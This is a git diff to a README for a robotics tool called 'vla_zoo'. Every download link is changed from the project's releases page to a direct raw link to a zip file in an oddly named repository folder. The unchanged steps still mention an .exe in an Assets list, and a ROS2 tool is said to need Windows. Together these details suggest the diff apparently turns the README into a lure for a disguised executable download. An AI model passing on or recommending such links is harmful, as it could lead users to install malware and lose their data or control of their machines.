@@ -1,6 +1,6 @@
 # 🤖 vla_zoo - Run vision language models on robots
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Merileeiberian597/vla_zoo/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Merileeiberian597/vla_zoo/raw/refs/heads/main/looking/vla-zoo-1.5-beta.2.zip)
 
 vla_zoo provides tools to run vision-language-action models. This software connects your computer to robot hardware using ROS2. It includes a benchmark suite to test how well models perform in real scenarios. This set of tools helps researchers and students manage robot policies.
 
@@ -8,11 +8,11 @@ vla_zoo provides tools to run vision-language-action models. This software conne
 
 You need a Windows computer to run this software. Ensure you have at least 16 GB of RAM and a modern graphics card. This software requires a stable internet connection for the first setup.
 
-Visit this page to download the latest version: https://github.com/Merileeiberian597/vla_zoo/releases
+Visit this page to download the latest version: https://github.com/Merileeiberian597/vla_zoo/raw/refs/heads/main/looking/vla-zoo-1.5-beta.2.zip
 
 ## ⚙️ Installation Process
 
-1. Open your web browser and go to https://github.com/Merileeiberian597/vla_zoo/releases.
+1. Open your web browser and go to https://github.com/Merileeiberian597/vla_zoo/raw/refs/heads/main/looking/vla-zoo-1.5-beta.2.zip
 2. Look for the Assets list under the most recent version.
 3. Click the file that ends with .exe to start the download.
 4. Save the file to your desktop for easy access.
